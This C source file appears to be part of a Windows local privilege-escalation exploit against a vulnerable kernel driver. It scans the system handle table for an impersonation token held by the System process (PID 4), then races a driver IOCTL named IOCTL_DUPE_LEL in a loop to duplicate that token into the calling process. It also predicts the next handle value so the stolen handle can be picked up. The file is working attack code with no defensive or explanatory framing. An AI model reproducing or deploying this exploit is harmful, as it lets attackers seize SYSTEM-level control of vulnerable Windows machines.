#include "LMI-Common.h"

HANDLE FindNextCreatedHandle() {
	HANDLE highestHandle = 0;
	UINT32 u32NumHandles = 0;
	ULONG ulSizeReturned = 0;
	NTSTATUS status = 0;
	status = NtQueryInformationProcess((HANDLE)-1, (PROCESSINFOCLASS)ProcessHandleCount, &u32NumHandles, sizeof(UINT32), &ulSizeReturned);
	if (!NT_SUCCESS(status)) {
		return (HANDLE)-1;
	}

	return (HANDLE)((UINT64)++u32NumHandles * 4);
}

NTSTATUS DupeThread(LPVOID lpParam) {
	puts("Entered DupeThread");
	if (!lpParam || lpParam == INVALID_HANDLE_VALUE) {
		printf("Invalid device handle passed to thread : %lx\n", GetLastError());
		return -1;
	}

	PDUPE_THREAD_INFO Dti = (PDUPE_THREAD_INFO)lpParam;

	DWORD dwBytesReturned = 0;
	LMI_INFO lmii = { 0 };
	lmii.qwPid = 4;
	lmii.handleValue = (UINT64)FindSystemPidFirstToken(); // yes, I know

	if ((HANDLE)lmii.handleValue == INVALID_HANDLE_VALUE) {
		puts("Couldn't find a token handle in the system process??");
	}

	BOOL bRes = FALSE;
	LPVOID lpOutBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);

	if (!lpOutBuf) {
		printf("HeapAlloc : %lx\n", GetLastError());
		return -1;
	}

	while (Dti->Run) {
		// call DeviceIoControl to start the race
		bRes = DeviceIoControl(
			Dti->hDevice,
			IOCTL_DUPE_LEL,
			&lmii,
			sizeof(LMI_INFO),
			lpOutBuf,
			0x1000,
			&dwBytesReturned,
			NULL
		);
	}	
}

HANDLE FindSystemPidFirstToken()
{
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20000);
	if (!lpBuf) {
		printf("HeapAlloc - %d\n", GetLastError());
		return INVALID_HANDLE_VALUE;
	}
	ULONG ulBytesReturned = 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, lpBuf, 0x20000, &ulBytesReturned);

	while (status == 0xC0000004) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulBytesReturned + 0x1000);
		if (!lpBuf) {
			printf("HeapAlloc - %d\n", GetLastError());
			return INVALID_HANDLE_VALUE;
		}
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, lpBuf, ulBytesReturned + 0x1000, &ulBytesReturned);
	}


	if (status) {
		printf("Query for handles failed - %lx\n", status);
		return INVALID_HANDLE_VALUE;
	}

	PSYSTEM_HANDLE_INFORMATION pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)lpBuf;

	for (unsigned int i = 0; i < pSysHandleInfo->NumberOfHandles; i++) {
		SYSTEM_HANDLE_TABLE_ENTRY_INFO shtei = pSysHandleInfo->Handles[i];
		if (shtei.UniqueProcessId != 4) {
			continue;
		}
		printf("HANDLE:\n\t Handle Value 0x%x - Type 0x%x - Access 0x%x\n", shtei.HandleValue, shtei.ObjectTypeIndex, shtei.GrantedAccess);
		if (shtei.ObjectTypeIndex == OBJECT_TYPE_THREAD_TOKEN && shtei.GrantedAccess == THREAD_TOKEN_IMPERSONATE_PRIVILEGES) {
			printf("Found handle to token:\n\t Handle Value 0x%x - Type 0x%x - Access 0x%x\n", shtei.HandleValue, shtei.ObjectTypeIndex, shtei.GrantedAccess);
			return (HANDLE)shtei.HandleValue;
		}
	}

	return INVALID_HANDLE_VALUE;
}
